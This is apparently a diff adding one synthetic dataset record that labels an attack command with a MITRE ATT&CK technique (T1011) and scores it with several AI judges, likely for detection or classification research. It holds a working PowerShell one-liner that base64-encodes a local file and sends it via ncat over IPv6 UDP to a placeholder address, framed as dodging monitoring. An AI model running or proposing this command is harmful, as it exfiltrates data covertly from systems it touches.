@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u 2001:db8:dead:beef::20 57344 --send-only",
+  "explanation": "Uses Nmap's ncat to exfiltrate over IPv6 UDP to a high, uncommon port, distinct from typical web egress. Base64 reduces readability while staying within simple encoding, consistent with T1011’s use of a different network medium.",
+  "rationale_steps": [
+    "Encode file bytes to Base64.",
+    "Transmit over IPv6 UDP to an uncommon high-numbered port to avoid standard monitoring paths."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-21870377",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell assignment and pipeline are well-formed with balanced quoting, and the ncat.exe arguments (-6, -u, address, port, --send-only) are valid.",
+        "semantic_score": 3,
+        "semantic_justification": "While it plausibly exfiltrates data over IPv6/UDP via ncat, this aligns better with exfiltration over an alternative network protocol/address family than with T1011’s use of a different network medium (e.g., cellular, Wi‑Fi, Bluetooth).",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T00:17:31.798536Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced brackets and parentheses, proper semicolon separators, valid ncat flags (-6 for IPv6, -u for UDP, --send-only), and correct quoting around the file path.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command correctly reads and base64-encodes a file then pipes it to ncat over IPv6 UDP on a high port, T1011 specifically refers to exfiltration over a *different network medium* (e.g., cellular, Bluetooth, Wi-Fi as opposed to the primary wired/monitored network), whereas this command simply uses IPv6 UDP over what is likely the same network interface, making it more accurately T1048 (Exfiltration Over Alternative Protocol) than T1011; additionally, piping a string variable to ncat may not transmit the data as expected without explicit echo or Write-Output.",
+        "combined_score": 4.0,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T21:56:49.647660Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid PowerShell .NET accelerators for file reading and Base64 conversion, followed by a valid Ncat execution with appropriate flags for IPv6 UDP transport.",
+        "semantic_score": 4,
+        "semantic_justification": "The command successfully exfiltrates data using an alternative protocol (IPv6/UDP), though it technically falls closer to T1048 (Alternative Protocol) than T1011 (Other Network Medium) unless the IPv6 traffic is specifically routed over a secondary physical interface not mentioned in the command.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T21:56:59.228262Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
